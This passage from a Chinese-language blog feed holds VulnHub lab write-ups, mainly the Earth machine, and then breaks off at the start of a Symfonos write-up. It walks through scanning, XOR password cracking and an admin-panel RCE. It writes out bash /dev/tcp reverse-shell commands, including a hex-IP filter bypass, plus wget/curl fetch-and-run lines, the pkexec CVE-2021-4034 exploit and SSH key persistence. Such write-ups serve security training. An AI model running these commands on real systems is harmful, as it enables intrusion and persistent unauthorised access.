&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-061.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.67&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31. 67 -oN /tmp/earth.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-062.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 Hosts&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjc=&#34;&gt;http://192.168.31.67&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjY3&#34;&gt;https://192.168.31.67&lt;/span&gt; 发现两个网址都无法打开&lt;br&gt;
注意到端口扫描的结果中， 443 中有如下说明：&lt;br&gt;
Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local&lt;br&gt;
 尝试修改本地 hosts 文件，将这两个域名解析指向 192.168.31.67&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo echo ‘192.168.31.67 earth.local terratest.earth.local’ &amp;gt;&amp;gt; /etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-063.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 更多信息暴露，有了更多的攻击面：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsLw==&#34;&gt;http://earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lYXJ0aC5sb2NhbC8=&#34;&gt;https://earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RlcnJhdGVzdC5lYXJ0aC5sb2NhbC8=&#34;&gt;http://terratest.earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwv&#34;&gt;https://terratest.earth.local/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsLw==&#34;&gt;http://earth.local/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://earth.local&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-064.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;弱口令测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#弱口令测试&#34;&gt;#&lt;/a&gt; 弱口令测试&lt;/h3&gt;
&lt;p&gt;登录地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsL2FkbWluL2xvZ2lu&#34;&gt;http://earth.local/admin/login&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-065.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;其他网址测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他网址测试&#34;&gt;#&lt;/a&gt; 其他网址测试&lt;/h3&gt;
&lt;p&gt;对其他三个网站进行目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u https://earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-066.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://terratest.earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-067.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u https://terratest.earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-068.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvcm9ib3RzLnR4dA==&#34;&gt;https://terratest.earth.local/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对 https://terratest.earth.local/robots.txt 进行分析&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-069.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现可疑地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGluZ25vdGVzLnR4dA==&#34;&gt;https://terratest.earth.local/testingnotes.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-070.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;下一步攻击思路，首页打开的数字字母的排列组合是 xor 加密运算&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-071.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGRhdGEudHh0&#34;&gt;https://terratest.earth.local/testdata.txt&lt;/span&gt; 为测试加密数据&lt;/p&gt;
&lt;p&gt;管理用户中有管理员：terra&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-072.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;xor-加密破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xor-加密破解&#34;&gt;#&lt;/a&gt; Xor 加密破解&lt;/h3&gt;
&lt;p&gt;编写 python 脚本，以 testdata.txt 为密钥，并注意删除其后面的空行，对首页得到的三份数据进行解密&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 1.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data1 =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = binascii.b2a_hex(open(&amp;#x27;testdata.txt&amp;#x27;, &amp;#x27;rb&amp;#x27;).read()).decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(int(data1,16) ^ int(f,16)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-073.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在线 16 进制数据转为字符串：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5hYjE3My5jb20vY29udmVydC9veDJzdHIucGhw&#34;&gt;http://www.ab173.com/convert/ox2str.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-074.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 去掉重复值得到：earthclimatechangebad4humans&lt;/p&gt;
&lt;h3 id=&#34;账户密码利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#账户密码利用&#34;&gt;#&lt;/a&gt; 账户密码利用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;已有凭据&lt;br&gt;
现在已成功拥有账户：terra&lt;br&gt;
 密码：earthclimatechangebad4humans&lt;br&gt;
 尝试进行连接：ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnRlcnJhQDE5Mi4xNjguMzEuNjc=&#34;&gt;terra@192.168.31.67&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-075.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 排除掉这是 ssh 的用户和密码&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;从之前得到的网址尝试登陆&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lYXJ0aC5sb2NhbC9hZG1pbi9sb2dpbg==&#34;&gt; https://earth.local/admin/login&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-076.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;登陆成功，发现 RCE 代码执行漏洞&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-077.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;rce-漏洞反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce-漏洞反弹shell&#34;&gt;#&lt;/a&gt; RCE 漏洞反弹 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;从之前得到的网址尝试登陆&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从最基础的反弹shell的命令尝试发现被过滤：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;quot;bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这里过滤的是ip地址，可将ip地址改为十六进制绕过：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/0xc0.0xa8.0x1f.0x87/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者连接到有域名的网址 [http://www.chentuo.asia](http://www.chentuo.asia)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;采用以下几种方法尝试下马执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://www.chentuo.asia/shell.sh &amp;amp;&amp;amp; chmod +x shell.sh &amp;amp;&amp;amp; ./shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://www.chentuo.asia/shell.sh &amp;amp;&amp;amp; sh shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-078.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;得到一个标准的 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-079.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-权限提升&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-权限提升&#34;&gt;#&lt;/a&gt; Pkexec 权限提升&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看靶机上的pkexec是否存在s权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls - Alh `which pkexec`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在攻击机kali上下载poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解压poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unzip master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从靶机上获取poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/pkexec/CVE-2021-4034-main /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd /tmp/CVE-2021-4034-main &amp;amp;&amp;amp; make &amp;amp; ./CVE-2021-4034&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取标准 shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-081.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密钥对维权&#34;&gt;#&lt;/a&gt; 密钥对维权&lt;/h3&gt;
&lt;p&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys &amp;amp;&amp;amp; rm -f id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-082.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-083.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 免密成功，下次可直接登录&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/106%20SYMFONOS/</guid>
            <title>VULNHUB 6 SYMFONOS</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/106%20SYMFONOS/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvc3ltZm9ub3MtNTIsNDE1Lw==&#34;&gt;https://www.vulnhub.com/entry/symfonos-52,415/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzAyL3Z1bG5odWItc3ltZm9ub3MtNS0yLw==&#34;&gt;https://readysetexploit.wordpress.com/2022/03/02/vulnhub-symfonos-5-2/&lt;/span&gt;&lt;br&gt;
 教程链接地址 2：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FyeWFuZ3VlbnRobmVyL1Z1bG5odWItQ1RGLVdyaXRldXBz&#34;&gt;https://github.com/aryanguenthner/Vulnhub-CTF-Writeups&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 SYMFONOS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-084.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
